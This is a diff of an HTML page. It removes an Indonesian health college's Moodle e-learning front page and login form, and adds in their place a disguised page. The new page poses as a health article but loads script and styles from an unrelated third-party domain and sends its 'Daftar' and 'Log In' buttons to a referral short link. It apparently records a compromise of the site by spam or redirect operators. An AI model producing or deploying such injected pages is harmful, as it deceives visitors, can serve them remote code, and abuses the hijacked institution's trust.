@@ -1,880 +1,371 @@
- <!DOCTYPE html>
 
-    <html  dir="ltr" lang="en" xml:lang="en">
-    <head>
-        <title>Home | E-Learning STIKes Bakti Utama Pati</title>
-        <link rel="shortcut icon" href="https://learning.stikesbup.ac.id/theme/image.php/boost/theme/1720755259/favicon" />
-        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta name="keywords" content="moodle, Home | E-Learning STIKes Bakti Utama Pati" />
-    <link rel="stylesheet" type="text/css" href="https://learning.stikesbup.ac.id/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.css" /><script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script><link rel="stylesheet" type="text/css" href="https://learning.stikesbup.ac.id/theme/styles.php/boost/1720755259_1/all" />
-    <script>
-    //<![CDATA[
-    var M = {}; M.yui = {};
-    M.pageloadstarttime = new Date();
-    M.cfg = {"wwwroot":"https:\/\/learning.stikesbup.ac.id","homeurl":{},"sesskey":"3nce5Rvl6D","sessiontimeout":"28800","sessiontimeoutwarning":1200,"themerev":"1720755259","slasharguments":1,"theme":"boost","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1720755259","admin":"admin","svgicons":true,"usertimezone":"America\/New_York","language":"en","courseId":1,"courseContextId":2,"contextid":2,"contextInstanceId":1,"langrev":1733389627,"templaterev":"1720755259"};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
-    var yui2ConfigFn = function(me) {var parts=me.name.replace(/^moodle-/,'').split('-'),component=parts.shift(),module=parts[0],min='-min';if(/-(skin|core)$/.test(me.name)){parts.pop();me.type='css';min=''}
-    if(module){var filename=parts.join('-');me.path=component+'/'+module+'/'+filename+min+'.'+me.type}else{me.path=component+'/'+component+'.'+me.type}};
-    YUI_config = {"debug":false,"base":"https:\/\/learning.stikesbup.ac.id\/lib\/yuilib\/3.17.2\/","comboBase":"https:\/\/learning.stikesbup.ac.id\/theme\/yui_combo.php?","combine":true,"filter":null,"insertBefore":"firstthemesheet","groups":{"yui2":{"base":"https:\/\/learning.stikesbup.ac.id\/lib\/yuilib\/2in3\/2.9.0\/build\/","comboBase":"https:\/\/learning.stikesbup.ac.id\/theme\/yui_combo.php?","combine":true,"ext":false,"root":"2in3\/2.9.0\/build\/","patterns":{"yui2-":{"group":"yui2","configFn":yui1ConfigFn}}},"moodle":{"name":"moodle","base":"https:\/\/learning.stikesbup.ac.id\/theme\/yui_combo.php?m\/1720755259\/","combine":true,"comboBase":"https:\/\/learning.stikesbup.ac.id\/theme\/yui_combo.php?","ext":false,"root":"m\/1720755259\/","patterns":{"moodle-":{"group":"moodle","configFn":yui2ConfigFn}},"filter":null,"modules":{"moodle-core-event":{"requires":["event-custom"]},"moodle-core-blocks":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification"]},"moodle-core-handlebars":{"condition":{"trigger":"handlebars","when":"after"}},"moodle-core-tooltip":{"requires":["base","node","io-base","moodle-core-notification-dialogue","json-parse","widget-position","widget-position-align","event-outside","cache-base"]},"moodle-core-maintenancemodetimer":{"requires":["base","node"]},"moodle-core-languninstallconfirm":{"requires":["base","node","moodle-core-notification-confirm","moodle-core-notification-alert"]},"moodle-core-popuphelp":{"requires":["moodle-core-tooltip"]},"moodle-core-notification":{"requires":["moodle-core-notification-dialogue","moodle-core-notification-alert","moodle-core-notification-confirm","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-core-notification-dialogue":{"requires":["base","node","panel","escape","event-key","dd-plugin","moodle-core-widget-focusafterclose","moodle-core-lockscroll"]},"moodle-core-notification-alert":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-confirm":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-exception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-ajaxexception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-lockscroll":{"requires":["plugin","base-build"]},"moodle-core-chooserdialogue":{"requires":["base","panel","moodle-core-notification"]},"moodle-core-formchangechecker":{"requires":["base","event-focus","moodle-core-event"]},"moodle-core-actionmenu":{"requires":["base","event","node-event-simulate"]},"moodle-core-dragdrop":{"requires":["base","node","io","dom","dd","event-key","event-focus","moodle-core-notification"]},"moodle-core_availability-form":{"requires":["base","node","event","event-delegate","panel","moodle-core-notification-dialogue","json"]},"moodle-backup-backupselectall":{"requires":["node","event","node-event-simulate","anim"]},"moodle-backup-confirmcancel":{"requires":["node","node-event-simulate","moodle-core-notification-confirm"]},"moodle-course-util":{"requires":["node"],"use":["moodle-course-util-base"],"submodules":{"moodle-course-util-base":{},"moodle-course-util-section":{"requires":["node","moodle-course-util-base"]},"moodle-course-util-cm":{"requires":["node","moodle-course-util-base"]}}},"moodle-course-categoryexpander":{"requires":["node","event-key"]},"moodle-course-management":{"requires":["base","node","io-base","moodle-core-notification-exception","json-parse","dd-constrain","dd-proxy","dd-drop","dd-delegate","node-event-delegate"]},"moodle-course-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-course-coursebase","moodle-course-util"]},"moodle-form-passwordunmask":{"requires":[]},"moodle-form-dateselector":{"requires":["base","node","overlay","calendar"]},"moodle-form-shortforms":{"requires":["node","base","selector-css3","moodle-core-event"]},"moodle-question-preview":{"requires":["base","dom","event-delegate","event-key","core_question_engine"]},"moodle-question-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-question-searchform":{"requires":["base","node"]},"moodle-availability_completion-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_date-form":{"requires":["base","node","event","io","moodle-core_availability-form"]},"moodle-availability_grade-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_group-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_grouping-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_profile-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-mod_assign-history":{"requires":["node","transition"]},"moodle-mod_quiz-questionchooser":{"requires":["moodle-core-chooserdialogue","moodle-mod_quiz-util","querystring-parse"]},"moodle-mod_quiz-modform":{"requires":["base","node","event"]},"moodle-mod_quiz-autosave":{"requires":["base","node","event","event-valuechange","node-event-delegate","io-form"]},"moodle-mod_quiz-util":{"requires":["node","moodle-core-actionmenu"],"use":["moodle-mod_quiz-util-base"],"submodules":{"moodle-mod_quiz-util-base":{},"moodle-mod_quiz-util-slot":{"requires":["node","moodle-mod_quiz-util-base"]},"moodle-mod_quiz-util-page":{"requires":["node","moodle-mod_quiz-util-base"]}}},"moodle-mod_quiz-quizbase":{"requires":["base","node"]},"moodle-mod_quiz-toolboxes":{"requires":["base","node","event","event-key","io","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-slot","moodle-core-notification-ajaxexception"]},"moodle-mod_quiz-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-base","moodle-mod_quiz-util-page","moodle-mod_quiz-util-slot","moodle-course-util"]},"moodle-message_airnotifier-toolboxes":{"requires":["base","node","io"]},"moodle-filter_glossary-autolinker":{"requires":["base","node","io-base","json-parse","event-delegate","overlay","moodle-core-event","moodle-core-notification-alert","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-filter_mathjaxloader-loader":{"requires":["moodle-core-event"]},"moodle-editor_atto-rangy":{"requires":[]},"moodle-editor_atto-editor":{"requires":["node","transition","io","overlay","escape","event","event-simulate","event-custom","node-event-html5","node-event-simulate","yui-throttle","moodle-core-notification-dialogue","moodle-core-notification-confirm","moodle-editor_atto-rangy","handlebars","timers","querystring-stringify"]},"moodle-editor_atto-plugin":{"requires":["node","base","escape","event","event-outside","handlebars","event-custom","timers","moodle-editor_atto-menu"]},"moodle-editor_atto-menu":{"requires":["moodle-core-notification-dialogue","node","event","event-custom"]},"moodle-report_eventlist-eventfilter":{"requires":["base","event","node","node-event-delegate","datatable","autocomplete","autocomplete-filters"]},"moodle-report_loglive-fetchlogs":{"requires":["base","event","node","io","node-event-delegate"]},"moodle-gradereport_history-userselector":{"requires":["escape","event-delegate","event-key","handlebars","io-base","json-parse","moodle-core-notification-dialogue"]},"moodle-qbank_editquestion-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-tool_capability-search":{"requires":["base","node"]},"moodle-tool_lp-dragdrop-reorder":{"requires":["moodle-core-dragdrop"]},"moodle-tool_monitor-dropdown":{"requires":["base","event","node"]},"moodle-assignfeedback_editpdf-editor":{"requires":["base","event","node","io","graphics","json","event-move","event-resize","transition","querystring-stringify-simple","moodle-core-notification-dialog","moodle-core-notification-alert","moodle-core-notification-warning","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-atto_accessibilitychecker-button":{"requires":["color-base","moodle-editor_atto-plugin"]},"moodle-atto_accessibilityhelper-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_align-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_bold-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_charmap-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_clear-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_collapse-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emojipicker-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emoticon-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_equation-button":{"requires":["moodle-editor_atto-plugin","moodle-core-event","io","event-valuechange","tabview","array-extras"]},"moodle-atto_h5p-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_html-beautify":{},"moodle-atto_html-codemirror":{"requires":["moodle-atto_html-codemirror-skin"]},"moodle-atto_html-button":{"requires":["promise","moodle-editor_atto-plugin","moodle-atto_html-beautify","moodle-atto_html-codemirror","event-valuechange"]},"moodle-atto_image-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_indent-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_italic-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_link-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-usedfiles":{"requires":["node","escape"]},"moodle-atto_managefiles-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_media-button":{"requires":["moodle-editor_atto-plugin","moodle-form-shortforms"]},"moodle-atto_noautolink-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_orderedlist-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_recordrtc-recording":{"requires":["moodle-atto_recordrtc-button"]},"moodle-atto_recordrtc-button":{"requires":["moodle-editor_atto-plugin","moodle-atto_recordrtc-recording"]},"moodle-atto_rtl-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_strike-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_subscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_superscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_table-button":{"requires":["moodle-editor_atto-plugin","moodle-editor_atto-menu","event","event-valuechange"]},"moodle-atto_title-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_underline-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_undo-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_unorderedlist-button":{"requires":["moodle-editor_atto-plugin"]}}},"gallery":{"name":"gallery","base":"https:\/\/learning.stikesbup.ac.id\/lib\/yuilib\/gallery\/","combine":true,"comboBase":"https:\/\/learning.stikesbup.ac.id\/theme\/yui_combo.php?","ext":false,"root":"gallery\/1720755259\/","patterns":{"gallery-":{"group":"gallery"}}}},"modules":{"core_filepicker":{"name":"core_filepicker","fullpath":"https:\/\/learning.stikesbup.ac.id\/lib\/javascript.php\/1720755259\/repository\/filepicker.js","requires":["base","node","node-event-simulate","json","async-queue","io-base","io-upload-iframe","io-form","yui2-treeview","panel","cookie","datatable","datatable-sort","resize-plugin","dd-plugin","escape","moodle-core_filepicker","moodle-core-notification-dialogue"]},"core_comment":{"name":"core_comment","fullpath":"https:\/\/learning.stikesbup.ac.id\/lib\/javascript.php\/1720755259\/comment\/comment.js","requires":["base","io-base","node","json","yui2-animation","overlay","escape"]},"mathjax":{"name":"mathjax","fullpath":"https:\/\/cdn.jsdelivr.net\/npm\/mathjax@2.7.9\/MathJax.js?delayStartupUntil=configured"}}};
-    M.yui.loader = {modules: {}};
-    
-    //]]>
-    </script>
-    
-    
-    <meta name="spadacourse" id="spadacourse" content="" />
-    <meta name="spadadata" id="spadadata" content="3JXWytbU3dzF3NOHrdfW39yNhs3K4djdz9LYi5vh5c3QjYvT0dDX0ZWjz+jczZCD0tKGqZ7i" />
-    <meta name="spada_cek_wwwroot" id="spada_cek_wwwroot" content="https%3A%2F%2Flearning.stikesbup.ac.id" />
-    <!-- SPADA INDONESIA 2 START -->
-    <script async defer>(function(w,d,s,l,i){var dtspada=document.querySelector('meta[name="spadadata"]').content; var wwwroot=document.querySelector('meta[name="spada_cek_wwwroot"]').content; w[l]=w[l]||[];w[l].push({'gtm.start':
-                new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-            'https://spada.kemdikbud.go.id/moodle/plugin.js?version=3.4&www='+wwwroot+'&location='+encodeURIComponent(encodeURIComponent(String(window.location)))+'&data='+encodeURIComponent(dtspada)+'&ids='+Math.random().toString(36).substring(7)+'&id='+i+dl;f.parentNode.insertBefore(j,f);
-    })(window,document,'script','dataLayer','67554d18-faa1-8f37-038e-4b9222fe271f');
-    </script>
-    <!-- SPADA INDONESIA 2 END -->
-    
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8">
+    <title>Pentingnya Menjaga Kesehatan Sejak Dini</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Menjaga kesehatan sejak dini sangat penting untuk kehidupan yang lebih sehat dan berkualitas. Temukan tips dan panduan pola hidup sehat.">
+    <meta name="keywords" content="kesehatan, hidup sehat, kesehatan mental, kesehatan tubuh">
+    <meta name="author" content="Berita Viral Hari Ini">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="canonical" href="https://berita-viral-hari-ini.github.io/kesehatan/">
+    <link rel="alternate" href="https://berita-viral-hari-ini.github.io/kesehatan/" hreflang="id-ID">
+    <link rel="shortcut icon" href="https://iili.io/3dlzmmx.png">
+        <!-- plugin css -->
+            <!-- App css -->
+        <link href="https://httpslotusnaillounge.com/data.css/bootstrap-modern.min.css" rel="stylesheet" type="text/css" id="bs-default-stylesheet" />
+        <link href="https://httpslotusnaillounge.com/data.css/app-modern.min.css" rel="stylesheet" type="text/css" id="app-default-stylesheet" />
+        <link href="https://httpslotusnaillounge.com/data.css/bootstrap-modern-dark.min.css" rel="stylesheet" type="text/css" id="bs-dark-stylesheet" />
+        <link href="https://httpslotusnaillounge.com/data.css/app-modern-dark.min.css" rel="stylesheet" type="text/css" id="app-dark-stylesheet" />
+        <!-- icons -->
+        <link href="https://httpslotusnaillounge.com/data.css/icons.min.css" rel="stylesheet" type="text/css" />
+                <!-- jquery -->
+        <script src="https://httpslotusnaillounge.com/data.js/jquery.2.1.1.min.js"></script>
+		<script src="https://httpslotusnaillounge.com/data.js/helper.js"></script>
     </head>
-    <body  id="page-site-index" class="limitedwidth format-site course path-site chrome dir-ltr lang-en yui-skin-sam yui3-skin-sam learning-stikesbup-ac-id pagelayout-frontpage course-1 context-2 notloggedin uses-drawers">
-    <div class="toast-wrapper mx-auto py-0 fixed-top" role="status" aria-live="polite"></div>
-    <div id="page-wrapper" class="d-print-block">
+    <body class="loading" data-layout-mode="horizontal" data-layout='{"mode": "light", "width": "fluid", "menuPosition": "fixed", "topbar": {"color": "dark"}, "showRightSidebarOnPageLoad": true}'>
+        <!-- Begin page -->
+        <div id="wrapper">
+
+            <!-- Topbar Start -->
+            <div class="navbar-custom">
+                <div class="container-fluid">
+                    <ul class="list-unstyled topnav-menu float-right mb-0">
+                        <li class="d-inline-block">
+                            <span class="nav-link dropdown-toggle waves-effect waves-light">
+                                <button class="btn btn-light waves-effect waves-light" onclick="location.href='//t.ly/pencarirefferal'">Daftar</button>
+                                <button class="btn btn-warning waves-effect waves-light" onclick="location.href='//t.ly/pencarirefferal'">Log In</button>
+                            </span>
+                        </li>
+                    </ul>
     
-        <div>
-        <a class="sr-only sr-only-focusable" href="#maincontent">Skip to main content</a>
-    </div><script src="https://learning.stikesbup.ac.id/lib/javascript.php/1720755259/lib/polyfills/polyfill.js"></script>
-    <script src="https://learning.stikesbup.ac.id/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.js"></script><script src="https://learning.stikesbup.ac.id/lib/javascript.php/1720755259/lib/javascript-static.js"></script>
-    <script>
-    //<![CDATA[
-    document.body.className += ' jsenabled';
-    //]]>
-    </script>
-    
-    
-    
-    <meta name="spadacourse" id="spadacourse" content="" />
-    <meta name="spadadata" id="spadadata" content="3JXWytbU3dzF3NOHrdfW39yNhs3K4djdz9LYi5vh5c3QjYvT0dDX0ZWjz+jczZCD0tKGqZ7i" />
-    <meta name="spada_cek_wwwroot" id="spada_cek_wwwroot" content="https%3A%2F%2Flearning.stikesbup.ac.id" />
-    <!-- SPADA INDONESIA 2 START -->
-    
-    <!-- SPADA INDONESIA 2 END -->
-    
-    
-        <nav class="navbar fixed-top navbar-light bg-white navbar-expand" aria-label="Site navigation">
-        
-            <button class="navbar-toggler aabtn d-block d-md-none px-1 my-1 border-0" data-toggler="drawers" data-action="toggle" data-target="theme_boost-drawers-primary">
-                <span class="navbar-toggler-icon"></span>
-                <span class="sr-only">Side panel</span>
-            </button>
-        
-            <a href="https://learning.stikesbup.ac.id/" class="navbar-brand d-none d-md-flex align-items-center m-0 mr-4 p-0 aabtn">
-        
-                    <img src="https://learning.stikesbup.ac.id/pluginfile.php/1/core_admin/logocompact/300x300/1720755259/logo-avatar.png" class="logo mr-1" alt="E-Learning STIKes Bakti Utama Pati">
-            </a>
-                <div class="primary-navigation">
-                    <nav class="moremenu navigation">
-                        <ul id="moremenu-67c30a2e4e8f1-navbar-nav" role="menubar" class="nav more-nav navbar-nav">
-                                    <li data-key="home" class="nav-item" role="none" data-forceintomoremenu="false">
-                                                <a role="menuitem" class="nav-link active "
-                                                    href="https://learning.stikesbup.ac.id/"
-                                                    
-                                                    aria-current="true"
-                                                    
-                                                >
-                                                    Home
-                                                </a>
-                                    </li>
-                            <li role="none" class="nav-item dropdown dropdownmoremenu d-none" data-region="morebutton">
-                                <a class="dropdown-toggle nav-link " href="#" id="moremenu-dropdown-67c30a2e4e8f1" role="menuitem" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" tabindex="-1">
-                                    More
-                                </a>
-                                <ul class="dropdown-menu dropdown-menu-left" data-region="moredropdown" aria-labelledby="moremenu-dropdown-67c30a2e4e8f1" role="menu">
-                                </ul>
-                            </li>
-                        </ul>
-                    </nav>
-                </div>
-        
-            <ul class="navbar-nav d-none d-md-flex my-1 px-1">
-                <!-- page_heading_menu -->
-                
-            </ul>
-        
-            <div id="usernavigation" class="navbar-nav ml-auto">
-                    <div class="langmenu">
-                        <div class="dropdown show">
-                            <a href="#" role="button" id="lang-menu-toggle" data-toggle="dropdown" aria-label="Language" aria-haspopup="true" aria-controls="lang-action-menu" class="btn dropdown-toggle">
-                                <i class="icon fa fa-language fa-fw mr-1" aria-hidden="true"></i>
-                                <span class="langbutton">
-                                    English ‎(en)‎
-                                </span>
-                                <b class="caret"></b>
-                            </a>
-                            <div role="menu" aria-labelledby="lang-menu-toggle" id="lang-action-menu" class="dropdown-menu dropdown-menu-right">
-                                        <a href="https://learning.stikesbup.ac.id/?lang=id" class="dropdown-item pl-5" role="menuitem" 
-                                                lang="id" >
-                                            Bahasa Indonesia ‎(id)‎
-                                        </a>
-                                        <a href="#" class="dropdown-item pl-5" role="menuitem" aria-current="true"
-                                                >
-                                            English ‎(en)‎
-                                        </a>
-                            </div>
-                        </div>
+                    <!-- LOGO -->
+                    <div class="logo-box">
+                        <a href="" class="logo logo-light text-center">
+                            <span class="logo-sm">
+                                <img src="https://iili.io/3dlzmmx.png" alt="" height="40">
+                            </span>
+                            <span class="logo-lg">
+                                <img src="https://iili.io/3dlzmmx.png" alt="" height="40">
+                            </span>
+                        </a>
                     </div>
-                    <div class="divider border-left h-75 align-self-center mx-1"></div>
-                
-                <div class="d-flex align-items-stretch usermenu-container" data-region="usermenu">
-                        <div class="usermenu">
-                                <span class="login pl-2">
-                                        <a href="https://learning.stikesbup.ac.id/login/index.php">Log in</a>
-                                </span>
-                        </div>
-                </div>
-                
-            </div>
-        </nav>
-        
-    
-    <div  class="drawer drawer-left drawer-primary d-print-none not-initialized" data-region="fixed-drawer" id="theme_boost-drawers-primary" data-preference="" data-state="show-drawer-primary" data-forceopen="0" data-close-on-resize="1">
-        <div class="drawerheader">
-            <button
-                class="btn drawertoggle icon-no-margin hidden"
-                data-toggler="drawers"
-                data-action="closedrawer"
-                data-target="theme_boost-drawers-primary"
-                data-toggle="tooltip"
-                data-placement="right"
-                title="Close drawer"
-            >
-                <i class="icon fa fa-times fa-fw " aria-hidden="true"  ></i>
-            </button>
-        </div>
-        <div class="drawercontent drag-container" data-usertour="scroller">
-                    <div class="list-group">
-                    <a href="https://learning.stikesbup.ac.id/" class="list-group-item list-group-item-action active " aria-current="true">
-                        Home
-                    </a>
-            </div>
-    
-        </div>
-    </div>
-            <div  class="drawer drawer-right d-print-none not-initialized" data-region="fixed-drawer" id="theme_boost-drawers-blocks" data-preference="drawer-open-block" data-state="show-drawer-right" data-forceopen="" data-close-on-resize="1">
-        <div class="drawerheader">
-            <button
-                class="btn drawertoggle icon-no-margin hidden"
-                data-toggler="drawers"
-                data-action="closedrawer"
-                data-target="theme_boost-drawers-blocks"
-                data-toggle="tooltip"
-                data-placement="left"
-                title="Close block drawer"
-            >
-                <i class="icon fa fa-times fa-fw " aria-hidden="true"  ></i>
-            </button>
-        </div>
-        <div class="drawercontent drag-container" data-usertour="scroller">
-                            <section class="d-print-none" aria-label="Blocks">
-                        
-                        <aside id="block-region-side-pre" class="block-region" data-blockregion="side-pre" data-droptarget="1"><a href="#sb-1" class="sr-only sr-only-focusable">Skip Login</a>
-    
-    <section id="inst574"
-         class=" block_login block  card mb-3"
-         role="complementary"
-         data-block="login"
-         data-instance-id="574"
-              aria-labelledby="instance-574-header"
-         >
-    
-        <div class="card-body p-3">
-    
-                <h5 id="instance-574-header" class="card-title d-inline">Login</h5>
-    
-    
-            <div class="card-text content mt-3">
-                
-    <form class="loginform" id="login" method="post" action="https://learning.stikesbup.ac.id/login/index.php"><div class="form-group"><label for="login_username">Username</label><input type="text" name="username" id="login_username"  class="form-control" value="" autocomplete="username"/></div><div class="form-group"><label for="login_password">Password</label><input type="password" name="password" id="login_password"  class="form-control" value="" autocomplete="current-password"/></div><div class="form-group"><input type="submit" class="btn btn-primary btn-block" value="Log in" /></div><input type="hidden" name="logintoken" value="lCL66NrT9iwtNKBGvwxtmi1Y4YSyjJ4r" /></form>
-    <div><a href="https://learning.stikesbup.ac.id/login/forgot_password.php">Lost password?</a></div>
-                <div class="footer"></div>
-                
-            </div>
-    
-        </div>
-    
-    </section>
-    
-      <span id="sb-1"></span><a href="#sb-2" class="sr-only sr-only-focusable">Skip Online users</a>
-    
-    <section id="inst583"
-         class=" block_online_users block  card mb-3"
-         role="complementary"
-         data-block="online_users"
-         data-instance-id="583"
-              aria-labelledby="instance-583-header"
-         >
-    
-        <div class="card-body p-3">
-    
-                <h5 id="instance-583-header" class="card-title d-inline">Online users</h5>
-    
-    
-            <div class="card-text content mt-3">
-                <div class="info">No online users (last 5 minutes)</div>
-                <div class="footer"></div>
-                
-            </div>
-    
-        </div>
-    
-    </section>
-    
-      <span id="sb-2"></span></aside>
-                    </section>
-    
-        </div>
-    </div>
-        <div id="page" data-region="mainpage" data-usertour="scroller" class="drawers   drag-container">
-            <div id="topofscroll" class="main-inner">
-                <div class="drawer-toggles d-flex">
-                        <div class="drawer-toggler drawer-right-toggle ml-auto d-print-none">
-                            <button
-                                class="btn icon-no-margin"
-                                data-toggler="drawers"
-                                data-action="toggle"
-                                data-target="theme_boost-drawers-blocks"
-                                data-toggle="tooltip"
-                                data-placement="right"
-                                title="Open block drawer"
-                            >
-                                <span class="sr-only">Open block drawer</span>
-                                <span class="dir-rtl-hide"><i class="icon fa fa-chevron-left fa-fw " aria-hidden="true"  ></i></span>
-                                <span class="dir-ltr-hide"><i class="icon fa fa-chevron-right fa-fw " aria-hidden="true"  ></i></span>
+                    <ul class="list-unstyled topnav-menu topnav-menu-left m-0">
+                        <li>
+                            <button class="button-menu-mobile waves-effect waves-light">
+                                <i class="fe-menu"></i>
                             </button>
-                        </div>
-                </div>
-                <header id="page-header" class="header-maxwidth d-print-none">
-        <div class="w-100">
-            <div class="d-flex flex-wrap">
-                <div class="ml-auto d-flex">
-                    
-                </div>
-                <div id="course-header">
-                    
+                        </li>
+                        <li>
+                            <!-- Mobile menu toggle (Horizontal Layout)-->
+                            <a class="navbar-toggle nav-link" data-toggle="collapse" data-target="#topnav-menu-content">
+                                <div class="lines">
+                                    <span></span>
+                                    <span></span>
+                                    <span></span>
+                                </div>
+                            </a>
+                            <!-- End mobile menu toggle-->
+                        </li>
+                    </ul>
+                    <div class="clearfix"></div>
                 </div>
             </div>
-            <div class="d-flex align-items-center">
-                        <div class="mr-auto">
-                            <div class="page-context-header"><div class="page-header-headings"><h1 class="h2">E-Learning STIKes Bakti Utama Pati</h1></div></div>
+             <!-- ============================================================== -->
+            <!-- Start Page Content here -->
+            <!-- ============================================================== -->
+            <div class="modal fade" id=myModal tabindex=-1 role=dialog aria-labelledby=myModalLabel aria-hidden=true>
+                <div class=modal-dialog>
+                    <div class=modal-content>
+                        <div class=modal-header>
+                            <h4>Halaman Penerimaan Mahasiswa Baru</h4>
                         </div>
-                <div class="header-actions-container ml-auto" data-region="header-actions-container">
-                </div>
-            </div>
-        </div>
-    </header>
-                <div id="page-content" class="pb-3 d-print-block">
-                    <div id="region-main-box">
-                        <section id="region-main" aria-label="Content">
-    
-                            <span class="notifications" id="user-notifications"></span>
-                            <div role="main"><span id="maincontent"></span><div class="course-content">
-        <div class="sitetopic">
-            <ul class="topics frontpage">
-                    <li id="section-1"
-                        class="section course-section main  clearfix
-                                 
-                                "
-                        data-sectionid="1"
-                        data-sectionreturnid="1"
-                        data-for="section"
-                        data-id="1"
-                        data-number="1"
-                    >
-                        <div class="course-section-header d-flex"
-                            data-for="section_title"
-                            data-id="1"
-                            data-number="1"
-                        >
-                                    
-                                            <h2 id="sectionid-1-title" class="sectionname">
-                                                Butuh Bantuan Terkait E-Learning?
-                                            </h2>
-                                <div data-region="sectionbadges" class="sectionbadges d-flex align-items-center">
-                                </div>
-                                </div>
-                                <div id="coursecontentcollapse1"
-                                    class="content 
-                                        
-                                    ">
-                                    <div class=" my-3" data-for="sectioninfo">
-                                                <div class="course-description-item summarytext">
-                                                    <div class="description-inner">
-                                                        <div class="no-overflow"><p dir="ltr" style="text-align: left;"><strong>Hubungi:</strong></p><ul dir="ltr"><li style="text-align: left;"><strong>Pak Bagus</strong></li></ul><div style="margin-left: 30px;" class="editor-indent"><p dir="ltr" style="text-align: left;"><a href="https://wa.me/6289681210290" target="_blank" title="https://wa.me/6289681210290"><img src="https://learning.stikesbup.ac.id/pluginfile.php/2/course/section/1/WhatsApp.svg.png" alt="" width="50" height="50" role="presentation" class="img-fluid atto_image_button_text-bottom"></a></p></div><ul dir="ltr"><li style="text-align: left;"><strong>Pak Thoyyib</strong></li></ul><p dir="ltr" style="text-align: left;"></p><div style="margin-left: 30px;" class="editor-indent"><p dir="ltr"><a href="https://wa.me/6281325692455" target="_blank" title="https://wa.me/6281325692455"><img src="https://learning.stikesbup.ac.id/pluginfile.php/2/course/section/1/WhatsApp.svg.png" alt="" width="50" height="50" role="presentation"></a></p></div><br><p></p></div>
-                                                    </div>
-                                                </div>
-                                            <div class="section_availability course-description-item">
-                                            </div>
-                                </div>
-                                        <ul class="section m-0 p-0 img-text " data-for="cmlist">
-                                            </ul>
-                                
+                        <div class=modal-body></div>
+                        <div class=modal-footer>
+                            <button type=button id=btC class="btn btn-default" data-dismiss=modal>Close</button>
                         </div>
-                    </li>
-            </ul>
-        </div>
-    </div><a class="skip-block skip aabtn" href="#skipsitenews">Skip site announcements</a><div id="site-news-forum"><h2>Site announcements</h2><div id="discussion-list-67c30a2e9564967c30a2e5257c2" data-contextid="484" data-cmid="102" data-name="Site announcements" data-group="" data-grading-component="" data-grading-component-subtype="" data-gradable-itemtype="forum" >
-    
-    
-        
-    
-    
-        <div class="py-3">
-        </div>
-    
-            <div class="forumnodiscuss alert alert-info">
-                    There are no discussion topics yet in this forum
-            </div>
-    
-    </div></div><span class="skip-block-to" id="skipsitenews"></span><br /></div>
-                            
-                            
-    
-                        </section>
                     </div>
                 </div>
             </div>
-            
-            <footer id="page-footer" class="footer-popover bg-white">
-                <div data-region="footer-container-popover">
-                    <button class="btn btn-icon bg-secondary icon-no-margin btn-footer-popover" data-action="footer-popover" aria-label="Show footer">
-                        <i class="icon fa fa-question fa-fw " aria-hidden="true"  ></i>
-                    </button>
-                </div>
-                <div class="footer-content-popover container" data-region="footer-content-popover">
